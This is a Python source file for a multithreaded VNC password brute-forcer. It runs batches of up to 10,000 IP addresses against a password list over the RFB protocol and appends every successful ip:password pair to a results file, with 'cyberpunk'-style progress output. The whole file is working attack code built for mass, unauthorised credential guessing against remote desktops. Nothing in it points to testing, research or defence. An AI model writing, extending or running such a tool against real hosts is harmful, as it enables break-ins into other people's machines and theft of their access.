from concurrent.futures import ThreadPoolExecutor, as_completed
from rfb import RFBProtocol
from matrix_ui import found_box, cyberpunk_summary
import time
from itertools import islice

def batcher(iterable, n):
    it = iter(iterable)
    while True:
        batch = list(islice(it, n))
        if not batch:
            break
        yield batch

def brute_force(ips, port, passwords, timeout, threads):
    results = []
    found_count = 0
    total = None
    if hasattr(ips, '__len__'):
        total = len(ips) * len(passwords)
    start_time = time.time()
    with open("output/results.txt", "a") as f:
        for ip_batch in batcher(ips, 10000):
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = []
                for ip in ip_batch:
                    for pwd in passwords:
                        futures.append(executor.submit(try_login, ip, port, pwd, timeout))
                for future in as_completed(futures):
                    res = future.result()
                    if res:
                        results.append(res)
                        f.write(f"{res[0]}:{res[1]}\n")
                        f.flush()
                        found_count += 1
                        found_box(found_count, res[0], res[1])
    duration = time.time() - start_time
    if total is None:
        # Estimare total dacă e generator
        total = found_count
    cyberpunk_summary(found_count, total, duration, mode="BRUTE")
    return results

def try_login(ip, port, password, timeout):
    try:
        rfb = RFBProtocol(ip, password, port, timeout)
        rfb.connect()
        rfb.close()
        return (ip, password)
    except Exception:
        return None 